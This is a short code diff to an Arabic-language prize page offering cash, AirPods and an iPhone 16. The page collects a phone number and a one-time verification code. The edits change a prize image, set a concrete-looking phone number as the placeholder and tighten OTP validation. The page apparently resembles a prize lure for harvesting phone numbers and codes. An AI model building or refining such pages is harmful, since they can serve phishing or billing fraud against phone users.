@@ -475,7 +475,7 @@ AirPods
 <div class="prize">
 
 <img
-src="https://i.ibb.co/S7WWWXJN/cash.png"
+src="https://i.ibb.co/8gLMcC8N/pngtree-large-stack-of-money-representing-prosperity-and-success-png-image-20806841.png"
 />
 
 <div class="prize-title">
@@ -510,7 +510,7 @@ iPhone 16
 
 <input
 id="msisdn"
-placeholder="xxxxxxxxx"
+placeholder="564975091"
 maxlength="9"
 inputmode="numeric"
 pattern="[0-9]*"
@@ -543,6 +543,10 @@ onclick="sendPIN()"
 <input
 id="otp"
 placeholder="أدخل رمز التحقق"
+maxlength="6"
+inputmode="numeric"
+pattern="[0-9]*"
+oninput="this.value=this.value.replace(/[^0-9]/g,'')"
 />
 
 <button
@@ -664,9 +668,9 @@ async function verifyOTP(){
     const otp =
     document.getElementById('otp').value;
 
-    if(!otp){
+    if(otp.length < 4){
 
-        alert('أدخل رمز التحقق');
+        alert('أدخل رمز تحقق صحيح');
 
         return;
     }
